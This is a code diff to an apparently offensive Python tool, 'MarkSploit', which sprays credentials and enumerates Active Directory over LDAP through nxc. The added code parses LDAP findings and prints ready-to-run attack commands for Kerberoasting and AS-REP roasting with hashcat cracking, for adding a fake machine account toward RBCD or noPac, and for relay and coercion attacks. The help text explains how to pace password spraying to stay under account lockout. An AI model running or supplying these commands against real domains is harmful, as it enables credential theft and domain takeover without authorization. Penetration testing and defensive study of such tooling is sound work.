@@ -1362,32 +1362,83 @@ class MarkSploit:
         print()
         print_info("[*]", f"AD enrichment — read-only LDAP checks on "
                           f"{r.hostname or dc_ip} as {s.user}  (--no-deleg to skip)")
+        found = {}
         for label, cmd in checks:
             if self._stop.is_set():
                 break
             stdout, _, timed = self._run_proc(cmd, SUBPROCESS_TIMEOUT)
             if timed:
                 print_info("[-]", f"{label}: timed out", indent=1); continue
-            # Surface nxc's own [+] finding lines, trimmed of the connection noise.
-            hits = []
-            for raw in _ANSI_RE.sub("", stdout).splitlines():
-                line = raw.strip()
-                if not line or "[*]" in line[:40] or "[-]" in line[:40]:
-                    continue
-                if "[+]" in line:
-                    # keep the message after the [+] marker
-                    line = line.split("[+]", 1)[1].strip()
-                    # drop the plain bind-success echo
-                    if "\\" in line and ":" in line and " " not in line.split(":")[0]:
-                        continue
-                hits.append(line)
+            hits = self._parse_nxc_findings(stdout)
+            found[label] = hits
             if hits:
                 print_info("[+]", f"{label}  ({len(hits)}):", indent=1)
                 for h in hits[:40]:
                     print(f"      {h}", flush=True)
             else:
                 print_info("[*]", f"{label}: none found", indent=1)
+        self._deleg_next_steps(found, dc_ip, r.domain or "domain.local")
         print()
+
+    @staticmethod
+    def _parse_nxc_findings(stdout: str) -> list[str]:
+        """Strip nxc's 'PROTO  IP  PORT  HOST' prefix and status/banner lines,
+        leaving only the actual query results (account names, MAQ value, etc.)."""
+        hits = []
+        for raw in _ANSI_RE.sub("", stdout).splitlines():
+            line = raw.rstrip()
+            if not line.strip():
+                continue
+            # Drop the nxc column prefix:  PROTO  IP  PORT  HOST  <content>
+            m = re.match(r"^\s*\S+\s+\d+\.\d+\.\d+\.\d+\s+\d+\s+\S+\s+(.*)$", line)
+            content = m.group(1).strip() if m else line.strip()
+            if not content:
+                continue
+            # Skip nxc status markers and the OS/bind banner
+            if content.startswith(("[*]", "[-]")):
+                continue
+            if "(name:" in content and "(domain:" in content:   # OS banner
+                continue
+            if content.startswith("[+]"):                       # bind-success echo
+                continue
+            hits.append(content)
+        return hits
+
+    def _deleg_next_steps(self, found: dict, dc_ip: str, domain: str) -> None:
+        """Turn the enrichment findings into concrete follow-up commands."""
+        def has(label):
+            return bool(found.get(label))
+        tips = []
+        if has("kerberoastable (SPN) accounts"):
+            tips.append(("roast the SPN accounts (crack offline, no lockout risk)",
+                         f"impacket-GetUserSPNs -request -dc-ip {dc_ip} {domain}/USER:PASS "
+                         f"-outputfile kerb.hash  &&  hashcat -m 13100 kerb.hash rockyou.txt"))
+        if has("AS-REP roastable (no preauth)"):
+            tips.append(("AS-REP roast (no creds needed)",
+                         f"impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -request -no-pass "
+                         f"-usersfile users.txt  &&  hashcat -m 18200 asrep.hash rockyou.txt"))
+        maq = found.get("MachineAccountQuota") or []
+        maq_val = next((x.split(":")[-1].strip() for x in maq if "Quota" in x), None)
+        if maq_val and maq_val.isdigit() and int(maq_val) > 0:
+            tips.append((f"MachineAccountQuota={maq_val} (>0) — you can add a computer -> RBCD / noPac",
+                         f"impacket-addcomputer {domain}/USER:PASS -dc-ip {dc_ip} "
+                         f"-computer-name 'FAKE$' -computer-pass 'Pass123!'"))
+        unc = [x for x in (found.get("unconstrained delegation") or []) if not x.endswith("$")] \
+              or (found.get("unconstrained delegation") or [])
+        if unc:
+            tips.append(("unconstrained delegation present — coerce auth then capture the TGT",
+                         "impacket-ntlmrelayx / PetitPotam / printerbug against the delegated host"))
+        if has("adminCount=1 (protected)"):
+            names = ", ".join(found["adminCount=1 (protected)"][:8])
+            tips.append((f"high-value targets (adminCount=1): {names}",
+                         "focus password-spray / kerberoast / cred-hunting on these"))
+        if not tips:
+            return
+        print()
+        print_info("[*]", "enrichment — suggested next steps", indent=1)
+        for why, cmd in tips:
+            print(f"      {ORANGE}# {why}{RESET}", flush=True)
+            print(f"      {cmd}", flush=True)
 
     # ── next steps ─────────────────────────────────────────────────────
     def _print_next_steps(self, results: list[TargetResult]) -> None:
@@ -1432,11 +1483,11 @@ class MarkSploit:
         if has_files:
             print()
             print_info("[*]", "output files", indent=1)
-            if self.save_file:   print_info("[*]", f"formatted output  →  {self.save_file}",   indent=2)
-            if self.creds_file:  print_info("[*]", f"valid creds (TSV) →  {self.creds_file}",  indent=2)
-            if self.json_out:    print_info("[*]", f"json results      →  {self.json_out}",     indent=2)
-            if self.script_file: print_info("[*]", f"shell script      →  {self.script_file}",  indent=2)
-            if self.log_file:    print_info("[*]", f"nxc raw log       →  {self.log_file}",     indent=2)
+            if self.save_file:   print_info("[*]", f"formatted output  ->  {self.save_file}",   indent=2)
+            if self.creds_file:  print_info("[*]", f"valid creds (TSV) ->  {self.creds_file}",  indent=2)
+            if self.json_out:    print_info("[*]", f"json results      ->  {self.json_out}",     indent=2)
+            if self.script_file: print_info("[*]", f"shell script      ->  {self.script_file}",  indent=2)
+            if self.log_file:    print_info("[*]", f"nxc raw log       ->  {self.log_file}",     indent=2)
         print()
 
 
@@ -1480,8 +1531,8 @@ def parse_args() -> argparse.Namespace:
 
 {BOLD}SPRAY vs NORMAL MODE{RESET}
 
-  Normal:  for each target → test all creds   (fast, lockout risk on AD)
-  Spray:   for each cred   → test all targets  (lockout-safe, recommended for AD)
+  Normal:  for each target -> test all creds   (fast, lockout risk on AD)
+  Spray:   for each cred   -> test all targets  (lockout-safe, recommended for AD)
 
   Use --spray-delay 30 to match a standard 30-minute observation window.
   A delay of 0 means no pause — only safe on non-AD or permissive lockout policy.
